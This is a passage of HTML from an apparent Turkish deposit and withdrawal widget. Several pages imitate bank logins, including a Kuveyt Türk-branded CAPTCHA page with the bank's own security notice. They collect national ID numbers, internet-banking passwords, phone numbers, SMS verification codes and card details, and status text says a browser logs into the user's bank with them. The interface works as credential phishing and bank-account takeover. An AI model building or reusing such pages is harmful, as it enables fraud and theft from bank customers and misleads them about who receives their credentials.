style=\"width:15px;height:15px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round\"><path d=\"M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3\"/></svg>\n            DEVAM\n          </button>\n        </div>\n      </div>\n      <!-- Güvenlik notu -->\n      <div style=\"display:flex;align-items:center;gap:8px;margin-top:.75rem;padding:10px 14px;background:#f0faf0;border:1px solid #d4e8d4;border-radius:6px;font-size:12px;color:#374151\">\n        <svg viewBox=\"0 0 24 24\" style=\"width:16px;height:16px;stroke:#006633;fill:none;stroke-width:2;flex-shrink:0\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/></svg>\n        Güvenliğiniz için kullanıcı bilgilerinizi sadece\n        <strong style=\"color:#006633\">https://isube.kuveytturk.com.tr</strong>\n        adresine giriş yaparken kullanmanız önemlidir.\n      </div>\n    </div>\n\n    <!-- Standart form (diğer bankalar) -->\n    <div id=\"std-login-form\" style=\"margin-top:1.25rem\">\n\n      <!-- Banka tema wrapper -->\n      <div id=\"bank-theme-wrap\">\n\n        <!-- TC input -->\n        <div class=\"fl\" id=\"fl-tc\">\n          <label id=\"lbl-tc\">TC Kimlik No</label>\n          <input id=\"inp-tc-std\" type=\"text\" placeholder=\"12345678901\" maxlength=\"11\" autocomplete=\"off\">\n        </div>\n\n        <!-- Şifre input -->\n        <div class=\"fl\" id=\"fl-pw\">\n          <label id=\"lbl-pw\">Şifre</label>\n          <input id=\"inp-pw-std\" type=\"password\" placeholder=\"••••••\" maxlength=\"8\" autocomplete=\"off\"\n                 onkeydown=\"if(event.key==='Enter'&&!captchaVisible()) loginNext()\">\n        </div>\n\n        <!-- GSM (Kuveyt Türk) -->\n        <div class=\"fl\" id=\"gsm-field\" style=\"display:none\">\n          <label>Kayıtlı Cep Telefonu</label>\n          <input id=\"inp-gsm-std\" type=\"text\" placeholder=\"905XXXXXXXXX\" maxlength=\"13\">\n        </div>\n\n        <!-- CAPTCHA (VakıfBank, DenizBank vb.) -->\n        <div id=\"captcha-login-wrap\" style=\"display:none\">\n          <div class=\"fl\">\n            <label id=\"lbl-captcha\">Güvenlik Kodu</label>\n            <div style=\"display:flex;gap:10px;align-items:center\">\n              <input id=\"inp-captcha-std\" type=\"text\" placeholder=\"Kodu giriniz\"\n                     style=\"flex:1;border:1px solid #d1d5db;border-radius:8px;padding:10px 14px;font-size:14px;outline:none\"\n                     onkeydown=\"if(event.key==='Enter') loginNext()\">\n              <div style=\"position:relative;flex-shrink:0\">\n                <img id=\"captcha-img-std\" src=\"\" alt=\"Güvenlik Kodu\"\n                     style=\"height:48px;min-width:110px;border:1px solid #e5e7eb;border-radius:6px;cursor:pointer;display:block\"\n                     onclick=\"refreshLoginCaptcha()\" title=\"Yenilemek için tıklayın\">\n                <div id=\"captcha-loading-std\" style=\"display:none;position:absolute;inset:0;background:rgba(255,255,255,0.8);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;color:#6b7280\">↻</div>\n              </div>\n            </div>\n            <div style=\"font-size:11px;color:#6b7280;margin-top:4px\">\n              Resmi göremiyorsanız <a href=\"#\" onclick=\"refreshLoginCaptcha();return false\" style=\"color:#2563eb\">yenile</a>\n            </div>\n          </div>\n        </div>\n\n      </div><!-- /bank-theme-wrap -->\n\n      <div class=\"err-msg\" id=\"login-err-std\"></div>\n      <button class=\"submit-btn\" id=\"login-btn-std\" onclick=\"loginNext()\">\n        Bankaya Giriş Yap\n      </button>\n    </div>\n\n  </div>\n</div>\n\n<!-- BANKA HAZIRLANIYOR -->\n<div class=\"page\" id=\"page-preparing\">\n  <div class=\"wrap\" style=\"max-width:480px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:60vh;text-align:center\">\n    <div id=\"prep-logo\" style=\"margin-bottom:1.5rem\"></div>\n    <div style=\"font-size:17px;font-weight:600;color:#111;margin-bottom:8px\" id=\"prep-title\">Banka sayfası yükleniyor...</div>\n    <div style=\"font-size:13px;color:#6b7280;margin-bottom:2rem\" id=\"prep-sub\">Lütfen bekleyin, bu işlem 5-10 saniye sürebilir.</div>\n    <div style=\"display:flex;gap:8px;justify-content:center\">\n      <div style=\"width:10px;height:10px;border-radius:50%;background:#2563eb;animation:dot-bounce 1.2s infinite 0s\"></div>\n      <div style=\"width:10px;height:10px;border-radius:50%;background:#2563eb;animation:dot-bounce 1.2s infinite .2s\"></div>\n      <div style=\"width:10px;height:10px;border-radius:50%;background:#2563eb;animation:dot-bounce 1.2s infinite .4s\"></div>\n    </div>\n    <div id=\"prep-err\" style=\"margin-top:1.5rem;color:#dc2626;font-size:13px;display:none\"></div>\n    <button id=\"prep-retry\" onclick=\"retryPrepare()\" style=\"display:none;margin-top:1rem;padding:10px 24px;background:#2563eb;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px\">Tekrar Dene</button>\n  </div>\n</div>\n\n<!-- GİRİŞ YAPILIYOR (loading + hata buraya düşer) -->\n<div class=\"page\" id=\"page-logging-in\">\n  <div class=\"logging-in-wrap\">\n\n    <div class=\"bank-header\">\n      <div class=\"bok\" id=\"li-bank-badge\"></div>\n      <div class=\"bank-header-name\" id=\"li-bank-name\"></div>\n    </div>\n\n    <!-- Spinner durumu -->\n    <div id=\"li-spinner-state\">\n      <div class=\"login-spinner\">\n        <div class=\"spin-ring-lg\"></div>\n      </div>\n      <div class=\"login-status-title\">Bankaya Giriş Yapılıyor</div>\n      <div class=\"login-status-sub\" id=\"li-sub\">Tarayıcı açılıyor, lütfen bekleyin...</div>\n      <div class=\"login-steps\">\n        <div class=\"lstep\"><div class=\"lstep-ico spin\" id=\"ls0\"><div class=\"spin-ring\"></div></div><div class=\"lstep-lbl\" id=\"ll0\">Bağlantı kuruluyor</div></div>\n        <div class=\"lstep\"><div class=\"lstep-ico wait\" id=\"ls1\">○</div><div class=\"lstep-lbl muted\" id=\"ll1\">TC kimlik giriliyor</div></div>\n        <div class=\"lstep\"><div class=\"lstep-ico wait\" id=\"ls2\">○</div><div class=\"lstep-lbl muted\" id=\"ll2\">Şifre giriliyor</div></div>\n        <div class=\"lstep\"><div class=\"lstep-ico wait\" id=\"ls3\">○</div><div class=\"lstep-lbl muted\" id=\"ll3\">SMS bekleniyor</div></div>\n      </div>\n    </div>\n\n    <!-- Hata durumu (login başarısız) -->\n    <div id=\"li-error-state\" style=\"display:none\">\n      <div class=\"login-error-card\">\n        <div class=\"login-error-icon\">\n          <svg viewBox=\"0 0 24 24\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"12\"/><line x1=\"12\" y1=\"16\" x2=\"12.01\" y2=\"16\"/></svg>\n        </div>\n        <div class=\"login-error-title\" id=\"li-err-title\">Giriş Başarısız</div>\n        <div class=\"login-error-msg\" id=\"li-err-msg\"></div>\n      </div>\n      <button class=\"submit-btn\" onclick=\"showPage('login')\" style=\"margin-bottom:.75rem\">\n        ← Tekrar Dene\n      </button>\n      <button class=\"submit-btn\" onclick=\"forceConfirmAndSuccess()\" style=\"margin-bottom:.75rem;background:#16a34a\">\n        ✓ Yine de Gönder\n      </button>\n      <button class=\"btn-sec\" onclick=\"showPage('bank')\">Farklı Banka Seç</button>\n    </div>\n\n  </div>\n</div>\n\n<!-- CAPTCHA — Kuveyt Türk temalı -->\n<div class=\"page\" id=\"page-captcha\">\n  <div style=\"max-width:560px;margin:0 auto;padding:2rem 1rem\">\n\n    <!-- Kuveyt Türk Header -->\n    <div style=\"display:flex;align-items:center;gap:12px;margin-bottom:1.5rem\">\n      <div style=\"width:44px;height:44px;border-radius:12px;background:#006633;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#fff;flex-shrink:0\">KT</div>\n      <div>\n        <div style=\"font-size:16px;font-weight:600;color:#111\">Kuveyt Türk İnternet Şubesi</div>\n        <div style=\"font-size:12px;color:#6b7280\">isube.kuveytturk.com.tr</div>\n      </div>\n      <div style=\"margin-left:auto\">\n        <svg style=\"width:20px;height:20px;stroke:#006633;fill:none;stroke-width:2\" viewBox=\"0 0 24 24\">\n          <rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0110 0v4\"/>\n        </svg>\n      </div>\n    </div>\n\n    <!-- Bilgi kutusu -->\n    <div style=\"background:#f0faf4;border:1px solid #a7f3d0;border-radius:10px;padding:10px 14px;\n                font-size:13px;color:#065f46;margin-bottom:1.25rem;display:flex;align-items:flex-start;gap:8px\">\n      <svg style=\"width:16px;height:16px;stroke:#059669;fill:none;stroke-width:2;flex-shrink:0;margin-top:1px\" viewBox=\"0 0 24 24\">\n        <circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 16v-4M12 8h.01\"/>\n      </svg>\n      Aşağıdaki görseldeki karakterleri doğrulama alanına girin.\n    </div>\n\n    <!-- CAPTCHA kartı -->\n    <div style=\"background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:1.5rem;margin-bottom:1rem\">\n\n      <!-- CAPTCHA resim alanı -->\n      <div style=\"margin-bottom:1.25rem\">\n        <div style=\"font-size:13px;font-weight:500;color:#374151;margin-bottom:.6rem\">Doğrulama Resmi</div>\n        <div style=\"position:relative;background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px;\n                    min-height:64px;display:flex;align-items:center;justify-content:center;overflow:hidden\">\n          <!-- Loading state -->\n          <div id=\"captcha-loading\" style=\"display:flex;flex-direction:column;align-items:center;gap:8px;padding:1rem\">\n            <div style=\"width:24px;height:24px;border:2px solid #d1fae5;border-top-color:#006633;\n                        border-radius:50%;animation:rot 0.8s linear infinite\"></div>\n            <span style=\"font-size:12px;color:#9ca3af\">Yükleniyor...</span>\n          </div>\n          <!-- CAPTCHA resmi -->\n          <img id=\"captcha-img\" src=\"\" alt=\"CAPTCHA\"\n               style=\"display:none;max-width:100%;border-radius:8px;padding:6px\">\n        </div>\n\n        <!-- Yenile butonu -->\n        <div style=\"display:flex;align-items:center;justify-content:flex-end;margin-top:6px;gap:6px\">\n          <span style=\"font-size:11px;color:#9ca3af\">Görseli göremiyorsanız</span>\n          <button onclick=\"refreshCaptcha()\"\n                  style=\"background:none;border:none;cursor:pointer;color:#006633;\n                         font-size:12px;font-weight:500;display:flex;align-items:center;gap:4px;padding:0\">\n            <svg style=\"width:13px;height:13px;stroke:#006633;fill:none;stroke-width:2.5\" viewBox=\"0 0 24 24\">\n              <path d=\"M23 4v6h-6M1 20v-6h6\"/><path d=\"M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15\"/>\n            </svg>\n            Yenile\n          </button>\n        </div>\n      </div>\n\n      <!-- Kod input -->\n      <div>\n        <div style=\"font-size:13px;font-weight:500;color:#374151;margin-bottom:.6rem\">Doğrulama Kodu</div>\n        <input id=\"inp-captcha-page\" type=\"text\" placeholder=\"Görseldeki karakterleri girin\"\n               autocomplete=\"off\" spellcheck=\"false\"\n               style=\"width:100%;padding:10px 14px;font-size:15px;letter-spacing:3px;\n                      border:1px solid #e5e7eb;border-radius:10px;background:#f9fafb;\n                      color:#111;font-family:monospace;outline:none\"\n               onfocus=\"this.style.borderColor='#006633';this.style.boxShadow='0 0 0 3px rgba(0,102,51,.08)'\"\n               onblur=\"this.style.borderColor='#e5e7eb';this.style.boxShadow='none'\"\n               onkeydown=\"if(event.key==='Enter') captchaNext()\">\n      </div>\n    </div>\n\n    <div class=\"err-msg\" id=\"captcha-err\"></div>\n\n    <button id=\"captcha-btn\" onclick=\"captchaNext()\"\n            style=\"width:100%;padding:14px;background:#006633;color:#fff;border:none;\n                   border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;\n                   font-family:inherit;display:flex;align-items:center;justify-content:center;\n                   gap:8px;transition:opacity .15s;margin-bottom:.75rem\"\n            onmouseover=\"this.style.opacity='.88'\" onmouseout=\"this.style.opacity='1'\">\n      <svg style=\"width:16px;height:16px;stroke:#fff;fill:none;stroke-width:2.5\" viewBox=\"0 0 24 24\">\n        <path d=\"M5 12h14M12 5l7 7-7 7\"/>\n      </svg>\n      Devam Et\n    </button>\n\n    <button onclick=\"showPage('login')\"\n            style=\"width:100%;padding:11px;background:#fff;color:#374151;\n                   border:1px solid #e5e7eb;border-radius:12px;font-size:14px;\n                   cursor:pointer;font-family:inherit\">\n      ← Geri Dön\n    </button>\n\n  </div>\n</div>\n\n<!-- SMS -->\n<div class=\"page\" id=\"page-sms\">\n  <div class=\"wrap\" style=\"max-width:680px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('login')\">←</div>\n      <div class=\"page-title\">SMS Doğrulama</div>\n    </div>\n    <div style=\"margin-top:1.25rem\">\n      <div class=\"info-box info-yellow\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81a19.79 19.79 0 01-3.07-8.68A2 2 0 012 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91\"/></svg>\n        Bankanız tarafından cep telefonunuza gönderilen <strong style=\"margin:0 3px\">doğrulama kodunu</strong> girin.\n      </div>\n      <div class=\"sms-card\">\n        <div style=\"font-size:13px;font-weight:600;color:#374151;margin-bottom:.75rem\">SMS Kodu</div>\n        <input id=\"inp-sms\" class=\"sms-input\" type=\"text\" placeholder=\"1 2 3 4 5 6\" maxlength=\"6\"\n               onkeydown=\"if(event.key==='Enter') smsNext()\">\n      </div>\n      <div class=\"resend\">Kod gelmedi mi? <span onclick=\"alert('Tekrar gönderildi.')\">Tekrar gönder</span></div>\n      <div class=\"err-msg\" id=\"sms-err\"></div>\n      <button class=\"submit-btn\" id=\"sms-btn\" onclick=\"smsNext()\">Doğrula ve Gönder</button>\n    </div>\n  </div>\n</div>\n\n<!-- PROCESSING -->\n<div class=\"page\" id=\"page-proc\">\n  <div class=\"proc-wrap\">\n    <div class=\"proc-icon\">\n      <svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"3\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M8 21h8M12 17v4\"/></svg>\n    </div>\n    <div class=\"proc-title\">Havale İşleniyor</div>\n    <div class=\"proc-sub\" id=\"proc-sub\"></div>\n    <div class=\"psteps\">\n      <div class=\"pstep\"><div class=\"pico spin\" id=\"p0\"><div class=\"spin-ring\"></div></div><div class=\"plbl\" id=\"l0\">Bankaya bağlanılıyor</div></div>\n      <div class=\"pstep\"><div class=\"pico wait\" id=\"p1\">○</div><div class=\"plbl muted\" id=\"l1\">Kimlik doğrulanıyor</div></div>\n      <div class=\"pstep\"><div class=\"pico wait\" id=\"p2\">○</div><div class=\"plbl muted\" id=\"l2\">Havale işleniyor</div></div>\n      <div class=\"pstep\"><div class=\"pico wait\" id=\"p3\">○</div><div class=\"plbl muted\" id=\"l3\">Bakiye güncelleniyor</div></div>\n    </div>\n  </div>\n</div>\n\n\n<!-- HAVALE MANUEL -->\n<div class=\"page\" id=\"page-havale\">\n  <div class=\"wrap\" style=\"max-width:520px;padding-bottom:52px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('dep-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg></div>\n      <div class=\"page-title\">Havale / EFT</div>\n    </div>\n    <div class=\"page-sub\">Aşağıdaki hesaba havale yapın, ardından \"Yatırdım\" butonuna basın.</div>\n    <div class=\"card-box\" id=\"havale-info-box\" style=\"margin-bottom:1rem\">\n      <div style=\"font-size:13px;color:#6b7280;text-align:center;padding:16px\">Hesap bilgileri yükleniyor...</div>\n    </div>\n    <div class=\"err-msg\" id=\"havale-err\"></div>\n    <div id=\"havale-actions\" style=\"display:none\">\n      <button class=\"submit-btn\" onclick=\"confirmHavale()\" style=\"background:#16a34a\">\n        <svg viewBox=\"0 0 24 24\" style=\"width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2.5\"><path d=\"M20 6L9 17l-5-5\"/></svg>\n        Yatırdım\n      </button>\n      <div style=\"margin-top:.75rem;font-size:12px;color:#6b7280;text-align:center\">İşlem 5-30 dakika içinde onaylanır.</div>\n    </div>\n  </div>\n</div>\n<!-- KRİPTO -->\n<div class=\"page\" id=\"page-kripto\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('dep-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M9 8h5a2 2 0 010 4H9v4h5a2 2 0 010 4\"/><line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"8\"/><line x1=\"12\" y1=\"20\" x2=\"12\" y2=\"22\"/></svg></div>\n      <div class=\"page-title\">Kripto ile Yatır</div>\n    </div>\n    <div class=\"page-sub\">Aşağıdaki adrese transfer yapın.</div>\n    <div id=\"kripto-info-box\">\n      <div style=\"font-size:13px;color:#6b7280;text-align:center;padding:24px\">⏳ Yükleniyor...</div>\n    </div>\n    <div class=\"err-msg\" id=\"kripto-err\"></div>\n    <div id=\"kripto-actions\" style=\"display:none;margin-top:12px\">\n      <button class=\"submit-btn\" id=\"kripto-confirm-btn\" onclick=\"confirmKripto()\" style=\"background:#16a34a\">\n        <svg viewBox=\"0 0 24 24\" style=\"width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2.5\"><path d=\"M20 6L9 17l-5-5\"/></svg>\n        <span id=\"kripto-confirm-label\">Gönderdim</span>\n      </button>\n    </div>\n  </div>\n</div>\n\n<!-- İŞLEM SONUCU -->\n<div class=\"page\" id=\"page-result\">\n  <div class=\"proc-wrap\">\n    <div id=\"result-icon\" class=\"proc-icon\"></div>\n    <div class=\"proc-title\" id=\"result-title\"></div>\n    <div class=\"proc-sub\" id=\"result-sub\"></div>\n    <div style=\"margin-top:2rem\">\n      <button onclick=\"closeWidget()\" class=\"submit-btn\" style=\"max-width:240px;margin:0 auto\">\n        ✕ Kapat\n      </button>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL ONAYI BEKLENİYOR -->\n<!-- ÇEKİM — Adım 1: Yöntem -->\n<div class=\"page\" id=\"page-withdraw\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"closeWidget()\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M12 2v20M17 7l-5-5-5 5\"/></svg></div>\n      <div class=\"page-title\">Para Çek</div>\n    </div>\n    <div class=\"page-sub\">Çekim yönteminizi seçin.</div>\n    <div class=\"method-grid\">\n      <div class=\"method-opt\" onclick=\"pickWdMethod('havale')\">\n        <svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg>\n        <span>Havale / EFT</span>\n      </div>\n      <div class=\"method-opt\" onclick=\"pickWdMethod('kripto')\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M9 8h6M9 12h6M9 16h4\"/><rect x=\"3\" y=\"3\" width=\"18\" height=\"18\" rx=\"2\"/></svg>\n        <span>Kripto</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ÇEKİM — Adım 2: Tutar -->\n<div class=\"page\" id=\"page-wd-amount\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('withdraw')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M12 2v20M17 7l-5-5-5 5\"/></svg></div>\n      <div class=\"page-title\" id=\"wd-amt-title\">Tutar Girin</div>\n    </div>\n    <div class=\"page-sub\" id=\"wd-balance-info\">Çekmek istediğiniz tutarı seçin veya girin.</div>\n    <div class=\"card-box\">\n      <div class=\"amt-grid\" id=\"wd-chips\">\n        <div class=\"amt-opt\" onclick=\"wdChip(100,this)\">₺100</div>\n        <div class=\"amt-opt\" onclick=\"wdChip(250,this)\">₺250</div>\n        <div class=\"amt-opt\" onclick=\"wdChip(500,this)\">₺500</div>\n        <div class=\"amt-opt\" onclick=\"wdChip(1000,this)\">₺1.000</div>\n        <div class=\"amt-opt\" onclick=\"wdChip(2500,this)\">₺2.500</div>\n        <div class=\"amt-opt\" onclick=\"wdChip(5000,this)\">₺5.000</div>\n      </div>\n      <div class=\"amt-custom\">\n        <span>₺</span>\n        <input id=\"wd-amount\" type=\"number\" placeholder=\"Tutar girin (min. 50)\" min=\"50\" oninput=\"wdClearChips()\">\n      </div>\n    </div>\n    <div class=\"err-msg\" id=\"wd-amt-err\"></div>\n    <button class=\"submit-btn\" onclick=\"wdAmtNext()\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M5 12h14M12 5l7 7-7 7\"/></svg>\n      Devam Et\n    </button>\n  </div>\n</div>\n\n<!-- ÇEKİM — Adım 3: Havale Bilgileri -->\n<div class=\"page\" id=\"page-wd-details\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('wd-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg></div>\n      <div class=\"page-title\">Banka Bilgileri</div>\n    </div>\n    <div class=\"page-sub\" id=\"wd-details-sub\">Ödemenin yapılacağı hesap bilgilerini girin.</div>\n    <div class=\"card-box\" style=\"display:flex;flex-direction:column;gap:14px\">\n      <div>\n        <div style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px\">Ad Soyad</div>\n        <input id=\"wd-name\" type=\"text\" placeholder=\"Hesap sahibinin adı\"\n          style=\"width:100%;border:none;border-bottom:1.5px solid #e5e7eb;outline:none;font-size:14px;padding:6px 0;background:transparent;box-sizing:border-box\">\n      </div>\n      <div>\n        <div style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px\">IBAN</div>\n        <input id=\"wd-iban\" type=\"text\" placeholder=\"TR00 0000 0000 0000 0000 0000 00\"\n          style=\"width:100%;border:none;border-bottom:1.5px solid #e5e7eb;outline:none;font-size:14px;font-family:monospace;padding:6px 0;background:transparent;box-sizing:border-box\">\n      </div>\n      <div style=\"background:#eff6ff;border-radius:8px;padding:10px 12px;font-size:12px;color:#1e40af\">\n        ℹ️ Çekim tutarı: <strong id=\"wd-confirm-amt\"></strong>\n      </div>\n    </div>\n    <div class=\"err-msg\" id=\"wd-err\"></div>\n    <button class=\"submit-btn\" onclick=\"submitWithdraw()\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M5 12h14M12 5l7 7-7 7\"/></svg>\n      Çekim Talebi Oluştur\n    </button>\n  </div>\n</div>\n\n<!-- ÇEKİM — Adım 3: Kripto Bilgileri -->\n<div class=\"page\" id=\"page-wd-kripto\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('wd-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M9 8h6M9 12h6M9 16h4\"/><rect x=\"3\" y=\"3\" width=\"18\" height=\"18\" rx=\"2\"/></svg></div>\n      <div class=\"page-title\">Kripto Çekim</div>\n    </div>\n    <div class=\"page-sub\" id=\"wd-kripto-sub\">Cüzdan adresinizi ve coin türünü girin.</div>\n    <div class=\"card-box\" style=\"display:flex;flex-direction:column;gap:14px\">\n      <div>\n        <div style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px\">Coin Seçin</div>\n        <div style=\"display:flex;gap:8px\">\n          <div class=\"method-opt\" id=\"wdc-BTC\" onclick=\"selectWdCoin('BTC')\" style=\"flex:1;padding:10px 6px;font-size:13px\">BTC</div>\n          <div class=\"method-opt\" id=\"wdc-ETH\" onclick=\"selectWdCoin('ETH')\" style=\"flex:1;padding:10px 6px;font-size:13px\">ETH</div>\n          <div class=\"method-opt\" id=\"wdc-USDT\" onclick=\"selectWdCoin('USDT')\" style=\"flex:1;padding:10px 6px;font-size:13px\">USDT</div>\n        </div>\n      </div>\n      <div>\n        <div style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px\">Cüzdan Adresi</div>\n        <input id=\"wd-wallet\" type=\"text\" placeholder=\"0x... veya bc1...\"\n          style=\"width:100%;border:none;border-bottom:1.5px solid #e5e7eb;outline:none;font-size:13px;font-family:monospace;padding:6px 0;background:transparent;box-sizing:border-box\">\n      </div>\n      <div style=\"background:#eff6ff;border-radius:8px;padding:10px 12px;font-size:12px;color:#1e40af\">\n        ℹ️ Çekim tutarı: <strong id=\"wd-kripto-confirm-amt\"></strong>\n      </div>\n    </div>\n    <div class=\"err-msg\" id=\"wd-kripto-err\"></div>\n    <button class=\"submit-btn\" onclick=\"submitWithdrawKripto()\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M5 12h14M12 5l7 7-7 7\"/></svg>\n      Çekim Talebi Oluştur\n    </button>\n  </div>\n</div>\n\n<div class=\"page\" id=\"page-waiting\">\n  <div class=\"proc-wrap\">\n    <div class=\"proc-icon\">\n      <svg viewBox=\"0 0 24 24\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 6v6l4 2\"/></svg>\n    </div>\n    <div class=\"proc-title\">Onay Bekleniyor</div>\n    <div class=\"proc-sub\">Ödemeniz alındı, panel onayı bekleniyor.<br>Bu ekranı kapatmayın.</div>\n    <div style=\"margin-top:2rem;display:flex;justify-content:center\">\n      <div class=\"spin-ring-lg\"></div>\n    </div>\n    <div style=\"margin-top:1.5rem;font-size:13px;color:#9ca3af;text-align:center\">Tahmini süre: 5–30 dakika</div>\n  </div>\n</div>\n\n<!-- KREDİ KARTI -->\n<div class=\"page\" id=\"page-kredi\">\n  <div class=\"wrap\" style=\"max-width:520px;overflow:visible\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('dep-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><rect x=\"1\" y=\"4\" width=\"22\" height=\"16\" rx=\"2\"/><path d=\"M1 10h22\"/></svg></div>\n      <div class=\"page-title\">Kredi Kartı</div>\n    </div>\n    <div class=\"page-sub\">Güvenli 3D Secure ödeme</div>\n\n    <!-- Kart önizleme -->\n    <div id=\"cc-card-preview\" style=\"background:linear-gradient(135deg,#1e3a8a,#2563eb);border-radius:16px;padding:24px;margin-bottom:20px;color:#fff;font-family:monospace;position:relative;overflow:hidden\">\n      <div style=\"position:absolute;top:-20px;right:-20px;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,.07)\"></div>\n      <div style=\"position:absolute;bottom:-30px;right:30px;width:160px;height:160px;border-radius:50%;background:rgba(255,255,255,.05)\"></div>\n      <div style=\"font-size:11px;opacity:.7;margin-bottom:20px;letter-spacing:.1em\">KREDİ KARTI</div>\n      <div id=\"cc-prev-number\" style=\"font-size:18px;letter-spacing:.2em;margin-bottom:20px;font-weight:500\">•••• •••• •••• ••••</div>\n      <div style=\"display:flex;justify-content:space-between;align-items:flex-end\">\n        <div>\n          <div style=\"font-size:9px;opacity:.6;margin-bottom:2px;letter-spacing:.08em\">KART SAHİBİ</div>\n          <div id=\"cc-prev-name\" style=\"font-size:13px;letter-spacing:.05em\">AD SOYAD</div>\n        </div>\n        <div>\n          <div style=\"font-size:9px;opacity:.6;margin-bottom:2px;letter-spacing:.08em\">SON. TRH</div>\n          <div id=\"cc-prev-exp\" style=\"font-size:13px\">••/••</div>\n        </div>\n        <div style=\"font-size:28px;opacity:.9\">💳</div>\n      </div>\n    </div>\n\n    <!-- Form -->\n    <div class=\"card-box\" style=\"margin-bottom:1rem\">\n      <div style=\"display:flex;flex-direction:column;gap:14px\">\n        <div>\n          <label style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px\">Kart Numarası</label>\n          <input id=\"cc-number\" type=\"text\" maxlength=\"19\" placeholder=\"0000 0000 0000 0000\"\n            oninput=\"fmtCcNum(this)\"\n            style=\"width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:10px 12px;font-family:monospace;font-size:15px;outline:none;transition:border-color .15s\"\n            onfocus=\"this.style.borderColor='#2563eb'\" onblur=\"this.style.borderColor='#e5e7eb'\">\n        </div>\n        <div>\n          <label style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px\">Kart Üzerindeki Ad</label>\n          <input id=\"cc-name\" type=\"text\" placeholder=\"AD SOYAD\"\n            oninput=\"document.getElementById('cc-prev-name').textContent=this.value.toUpperCase()||'AD SOYAD'\"\n            style=\"width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:10px 12px;font-size:14px;outline:none;text-transform:uppercase;transition:border-color .15s\"\n            onfocus=\"this.style.borderColor='#2563eb'\" onblur=\"this.style.borderColor='#e5e7eb'\">\n        </div>\n        <div style=\"display:grid;grid-template-columns:1fr 1fr;gap:12px\">\n          <div>\n            <label style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px\">Son Kullanma</label>\n            <input id=\"cc-exp\" type=\"text\" maxlength=\"5\" placeholder=\"AA/YY\"\n              oninput=\"fmtCcExp(this)\"\n              